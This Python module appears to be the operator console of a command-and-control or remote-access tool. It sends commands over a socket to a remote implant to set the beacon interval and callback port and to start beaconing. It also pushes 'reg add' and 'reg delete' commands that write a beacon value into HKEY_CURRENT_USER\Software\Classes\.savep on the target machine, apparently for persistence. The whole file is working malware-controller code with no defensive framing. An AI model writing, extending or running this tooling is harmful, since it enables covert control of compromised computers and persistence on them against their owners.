from printlib import *
from os import kill, getpid
from signal import SIGTERM
import tasker

def configure(conn):
    query(conn)
    ans = print_question_list("New Beacon Interval (sec)")
    send_data(conn, "[BEACON]{}".format(ans))

def change_port(conn):
    ans = print_question_list("Select Option","1 - Query Callback Port Config","2 - Set Callback Port")
    if ans == "1":
        send_data(conn, "[PORT]?")
        print_info("Current Callback Port:")
        recv_data(conn)
    elif ans == "2":
        ans = print_question("Enter new callback port")
        send_data(conn, "[PORT]{}".format(ans))

def query(conn):
    send_data(conn, "[BEACON]?")
    print_info("Current Setting (sec):")
    recv_data(conn)

def start_beaconing(conn):
    send_data(conn, "[BEACON]START")
    kill(getpid(), SIGTERM)

def save_beacon(conn):
    #send_data(conn, "[BEACON]?")
    #print_info("Current Setting (sec):")
    #recv_data(conn)
    
    ans = print_question("Enter Desired Beacon to Save on HDD")
    cmd1 = r"reg add HKEY_CURRENT_USER\Software\Classes\.savep /f"
    cmd2 = r"reg add HKEY_CURRENT_USER\Software\Classes\.savep /d {p} /f".format(p=ans)
    print_info("Beacon Command Settings to Run:\n{}\n{}".format(cmd1,cmd2))
    ans = print_question("Run? [y/n]")
    if ans.lower() == "y":
        print_info("Running cmd1")
        send_data(conn, cmd1)
        recv_data(conn)
        print_info("Running cmd2")
        send_data(conn, cmd2)
        recv_data(conn)

def delete_beacon_reg(conn):
    print_info("Removing Registry Setting")
    cmd = r"reg delete HKEY_CURRENT_USER\Software\Classes\.savep /f"
    send_data(conn, cmd)
    recv_data(conn)

def send_data(s, plain_text):
    msg = plain_text + "[END]"
    s.send(msg.encode('utf-8'))
    #s.send(encrypt(msg).encode('utf-8')+b"[END]")
    print_info("Sent:\n"  +plain_text)

def recv_data(conn):
    data = ""
    while not data.endswith('[END]'):
        recv = conn.recv(128)
        recv_decoded = recv.decode('utf-8')
        data = data + recv_decoded
    print(data.rstrip("[END]"))